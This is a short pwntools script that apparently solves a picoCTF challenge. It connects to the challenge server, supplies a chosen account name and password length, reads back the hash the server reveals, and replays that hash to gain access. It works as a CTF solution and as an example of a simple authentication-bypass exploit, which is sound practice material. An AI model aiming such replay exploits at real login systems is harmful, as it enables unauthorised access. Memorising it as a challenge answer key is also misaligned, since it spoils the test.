from pwn import *

io = remote("candy-mountain.picoctf.net", 61872)

io.sendlineafter(b"account:\n", b"AAAA")
io.sendlineafter(b"password?\n", b"4")

io.recvuntil(b"Enter your hash to access your account!\n")
hash_val = io.recvline().strip()
print(f"[*] Hash: {hash_val.decode()}")

io.sendline(hash_val)
print(io.recvall().decode())